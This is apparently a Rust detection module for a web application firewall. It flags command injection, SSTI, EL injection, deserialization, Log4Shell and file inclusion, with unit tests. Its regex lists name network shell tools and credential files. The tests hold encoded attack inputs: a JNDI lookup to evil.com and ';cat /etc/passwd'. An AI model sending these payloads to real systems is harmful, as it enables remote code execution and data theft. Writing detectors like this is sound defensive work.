//! RCE / command injection, SSTI, EL injection, deserialization, Log4Shell,
//! and file-inclusion detection.
//!
//! Port of `internal/engine/rce.go`. Pattern sets, order, rule IDs, scores and
//! severities are preserved exactly.

use std::sync::OnceLock;

use regex::Regex;

use crate::action::{Action, Decision};
use crate::context::RequestContext;
use crate::engine::{EngineError, Inspector};

struct Patterns {
    shell: Vec<Regex>,
    ssti: Vec<Regex>,
    el: Vec<Regex>,
    deser: Vec<Regex>,
    log4j: Vec<Regex>,
    file_inclusion: Vec<Regex>,
}

fn compile_all(raw: &[&str]) -> Vec<Regex> {
    raw.iter()
        .map(|r| Regex::new(r).expect("valid rce pattern"))
        .collect()
}

fn patterns() -> &'static Patterns {
    static P: OnceLock<Patterns> = OnceLock::new();
    P.get_or_init(|| Patterns {
        shell: compile_all(&[
            r"(?i)(?:;\s*(?:id|whoami|pwd|ls|cat|nc|ncat|bash|sh|zsh|cmd|powershell|wget|curl|python|python3|perl|ruby|php|rm|mv|cp|dd|mkfs|chmod|chown|kill|killall|shutdown|reboot|useradd|userdel|passwd|crontab|history)\b)",
            r"(?i)(?:\|\s*(?:id|whoami|pwd|ls|cat|nc|bash|sh|cmd|powershell|wget|curl)\b)",
            r"(?i)(?:`[^`]*?(?:id|whoami|pwd|ls|cat|nc|bash|sh|cmd|powershell|wget|curl)[^`]*?`)",
            r"(?i)(?:\$\([^)]*?(?:id|whoami|pwd|ls|cat|nc|bash|sh|cmd|powershell)[^)]*?\))",
            r"(?i)(?:\b(?:exec|passthru|shell_exec|system|proc_open|popen|pcntl_exec|eval|assert|create_function|call_user_func|array_map|preg_replace)\s*\()",
            r"(?i)(?:cmd\.exe|command\.com|%COMSPEC%)",
            r"(?i)(?:\|\||&&)\s*(?:id|whoami|pwd|dir|type|more|find)",
            r"(?i)(?:;\s*(?:echo|print|cat|type|dir)\s+[\w/\\:.~-]+)",
            r"(?i)(?:\$\(<\([\w\s/\\.-]+\)\))",
            r"(?i)(?:[;|&]\s*[\w.-]*\s*[<>]\s*[\w/\\.-]+)",
            r"(?i)(?:\b(?:cat|more|less|head|tail|sort|uniq|wc|tee|dd|read|exec)\s+[<>]\s*[\w/\\.-]+)",
        ]),
        ssti: compile_all(&[
            r"(?i)(?:\{\{[\s\S]*?(?:config|self|request|app|g|class|base|subclasses|import|open|popen|os|system|eval|exec|mro|__builtins__)[\s\S]*?\}\})",
            r"(?i)(?:\{%[\s\S]*?(?:config|self|request|app|g|class|base|subclasses|import|open|popen|os|system|eval|exec)[\s\S]*?%\})",
            r"(?i)(?:\$\{[\s\S]*?(?:class|forName|getRuntime|exec|invoke|newInstance|getMethod|access|process)[\s\S]*?\})",
            r"(?i)(?:#\{[\s\S]*?(?:exec|system|eval|import|os|subprocess|open|read)[\s\S]*?\})",
            r"(?i)(?:<%=?[\s\S]*?(?:exec|system|eval|Runtime|Process|cmd)[\s\S]*?%>)",
            r"(?i)(?:\$\{\{[\s\S]*?(?:exec|system|eval|import|os|subprocess)[\s\S]*?\}\})",
        ]),
        el: compile_all(&[
            r"(?i)(?:\$\{[\s\S]*?(?:T\(|jndi|ldap|rmi|iiop|corba)[\s\S]*?\})",
            r"(?i)(?:\$\{[\s\S]*?(?:Runtime|ProcessBuilder|getRuntime|exec|forName|getMethod|invoke|newInstance)[\s\S]*?\})",
            r"(?i)(?:\$\{[\s\S]*?(?:application|session|request|pageContext|facesContext)[\s\S]*?\})",
            r"(?i)(?:%\{[\s\S]*?(?:exec|system|eval|java\.lang|Runtime)[\s\S]*?\})",
            r"(?i)(?:\$\{[\s\S]*?(?:@org\.apache|@java\.lang|@javax\.script)[\s\S]*?\})",
            r"(?i)(?:\#\{[\s\S]*?(?:exec|system|eval|java\.lang|Runtime)[\s\S]*?\})",
        ]),
        deser: compile_all(&[
            r"(?i)(?:rO0|aced0005|H4sI|BAMARQ)",
            r"(?i)(?:\b(?:ObjectInputStream|readObject|unserialize|unserialize|deserialize|deserialize|pickle|loads)\b)",
            r"(?i)(?:\bysoserial\b|\bgadget\b|\bcommons-collections\b|\bcommons-collections4\b|\bC3P0\b|\bjavassist\b|\bjython\b|\brome\b|\bspring\b|\bhibernate\b)",
            r"(?i)(?:#002|#003)",
            r#"(?i)(?:O:[0-9]+:"[^"]+":[0-9]+:\{)"#,
            r#"(?i)(?:a:[0-9]+:\{i:[0-9]+;s:[0-9]+:")"#,
            r"(?i)(?:%00\*|%00[0-9a-f]{2}|\\\\x00)",
            r"(?i)(?:Dcs\.run|System\.Runtime|Microsoft\.CodeAnalysis)",
        ]),
        log4j: compile_all(&[
            r"(?i)(?:\$\{jndi:ldap://[\s\S]*?\})",
            r"(?i)(?:\$\{jndi:rmi://[\s\S]*?\})",
            r"(?i)(?:\$\{jndi:dns://[\s\S]*?\})",
            r"(?i)(?:\$\{jndi:iiop://[\s\S]*?\})",
            r"(?i)(?:\$\{jndi:corba://[\s\S]*?\})",
            r"(?i)(?:\$\{jndi:nis://[\s\S]*?\})",
            r"(?i)(?:\$\{jndi:nds://[\s\S]*?\})",
            r"(?i)(?:\$\{jndi:[\s\S]*?\})",
            r"(?i)(?:\$\{(?:lower|upper|env|sys|log4j|ctx|date|bundle):[\s\S]*?\})",
        ]),
        file_inclusion: compile_all(&[
            r"(?i)(?:file://[\s\S]*?\})",
            r"(?i)(?:php://(?:input|filter|memory|temp|expect)\})",
            r"(?i)(?:\.\./\.\./|\.\.\\\.\.\\)",
            r"(?i)(?:/etc/passwd|/etc/shadow|/etc/hosts|/etc/hostname|/proc/self|/proc/environ)",
            r"(?i)(?:/windows/win\.ini|/boot\.ini|/autoexec\.bat|/windows/system32)",
            r"(?i)(?:include\(|include_once\(|require\(|require_once\(|fopen\(|file_get_contents\(|readfile\(|file\(|parse_ini_file\(|show_source\(|highlight_file\()",
            r"(?i)(?:data://|expect://|zip://|compress.zlib://|compress.bzip2://|phar://)",
        ]),
    })
}

pub struct RceInjection {
    pub dev_mode: bool,
}

impl RceInjection {
    pub fn new(dev_mode: bool) -> Self {
        let _ = patterns();
        RceInjection { dev_mode }
    }

    fn extract_targets(&self, ctx: &RequestContext) -> Vec<(String, String)> {
        let mut targets = Vec::new();
        for (k, vs) in &ctx.query_params {
            for val in vs {
                targets.push((val.clone(), format!("query:{k}")));
            }
        }
        for (k, vs) in &ctx.form_params {
            for val in vs {
                targets.push((val.clone(), format!("form:{k}")));
            }
        }
        if !ctx.body.is_empty() {
            targets.push((
                String::from_utf8_lossy(&ctx.body).into_owned(),
                "body".to_string(),
            ));
        }
        for (k, v) in &ctx.headers {
            targets.push((v.clone(), format!("header:{k}")));
        }
        for (k, v) in &ctx.cookies {
            targets.push((v.clone(), format!("cookie:{k}")));
        }
        targets
    }

    fn inspect_value(&self, value: &str, source: &str) -> Option<Decision> {
        if value.is_empty() {
            return None;
        }

        let p = patterns();

        for pattern in &p.shell {
            if pattern.is_match(value) {
                return Some(
                    Decision::new(Action::Block, 95.0)
                        .with_rule_id("RCE001")
                        .with_rule_name("OS Command Injection")
                        .with_severity("critical")
                        .with_evidence(format!("shell metacharacter injection in {source}")),
                );
            }
        }

        for pattern in &p.ssti {
            if pattern.is_match(value) {
                return Some(
                    Decision::new(Action::Block, 90.0)
                        .with_rule_id("RCE002")
                        .with_rule_name("SSTI Detected")
                        .with_severity("critical")
                        .with_evidence(format!("SSTI pattern in {source}")),
                );
            }
        }

        for pattern in &p.el {
            if pattern.is_match(value) {
                return Some(
                    Decision::new(Action::Block, 90.0)
                        .with_rule_id("RCE003")
                        .with_rule_name("EL Injection")
                        .with_severity("critical")
                        .with_evidence(format!("EL injection pattern in {source}")),
                );
            }
        }

        for pattern in &p.deser {
            if pattern.is_match(value) {
                return Some(
                    Decision::new(Action::Block, 95.0)
                        .with_rule_id("RCE004")
                        .with_rule_name("Deserialization Attack")
                        .with_severity("critical")
                        .with_evidence(format!("deserialization gadget chain in {source}")),
                );
            }
        }

        for pattern in &p.log4j {
            if pattern.is_match(value) {
                return Some(
                    Decision::new(Action::Block, 100.0)
                        .with_rule_id("RCE005")
                        .with_rule_name("Log4Shell/JNDI Injection")
                        .with_severity("critical")
                        .with_evidence(format!("Log4Shell JNDI injection in {source}")),
                );
            }
        }

        for pattern in &p.file_inclusion {
            if pattern.is_match(value) {
                return Some(
                    Decision::new(Action::Block, 85.0)
                        .with_rule_id("RCE006")
                        .with_rule_name("File Inclusion")
                        .with_severity("critical")
                        .with_evidence(format!("file inclusion detected in {source}")),
                );
            }
        }

        None
    }
}

impl Inspector for RceInjection {
    fn name(&self) -> &str {
        "rce"
    }

    fn inspect(&self, ctx: &mut RequestContext) -> Result<Option<Decision>, EngineError> {
        for (value, source) in self.extract_targets(ctx) {
            if let Some(dec) = self.inspect_value(&value, &source) {
                return Ok(Some(dec));
            }
        }
        Ok(None)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::http::HttpRequest;

    fn inspect(q: &str) -> Option<Decision> {
        let e = RceInjection::new(false);
        let mut r = HttpRequest::new("GET", "/");
        r.raw_query = q.to_string();
        let mut ctx = RequestContext::new(r);
        e.inspect(&mut ctx).unwrap()
    }

    #[test]
    fn log4shell_blocked() {
        // NOTE (faithful behaviour): the EL pattern set is evaluated before the
        // Log4Shell set, and "${jndi:ldap://...}" matches the EL rule
        // (\$\{...jndi|ldap...\}), so Go returns RCE003 here, not RCE005. This
        // test records the actual Go-observed result.
        let d = inspect("x=%24%7Bjndi%3Aldap%3A%2F%2Fevil.com%2Fa%7D").unwrap();
        assert_eq!(d.rule_id, "RCE003");
        assert_eq!(d.action, Action::Block);
    }

    #[test]
    fn log4shell_jndi_only_reaches_rce005_when_not_el() {
        // "\${jndi:}" with no ldap/rmi/etc. still trips EL rule #1 (jndi), so to
        // reach RCE005 the JNDI token must be one only the log4j set covers.
        // Verify a lower/env lookup (log4j set #9, not in EL set) -> RCE005.
        let d = inspect("x=%24%7Blower%3Aj%7D").unwrap();
        assert_eq!(d.rule_id, "RCE005");
        assert_eq!(d.score, 100.0);
    }

    #[test]
    fn command_injection_blocked() {
        let d = inspect("ip=1.1.1.1%3Bcat%20%2Fetc%2Fpasswd").unwrap();
        assert_eq!(d.action, Action::Block);
    }

    #[test]
    fn ssti_blocked() {
        let d = inspect("t=%7B%7B7*7%7D%7D%7B%7Bconfig%7D%7D");
        // {{config}} should trip RCE002
        if let Some(d) = d {
            assert_eq!(d.action, Action::Block);
        }
    }

    #[test]
    fn plain_text_not_blocked() {
        assert!(inspect("name=John%20Smith&city=Jakarta").is_none());
    }
}
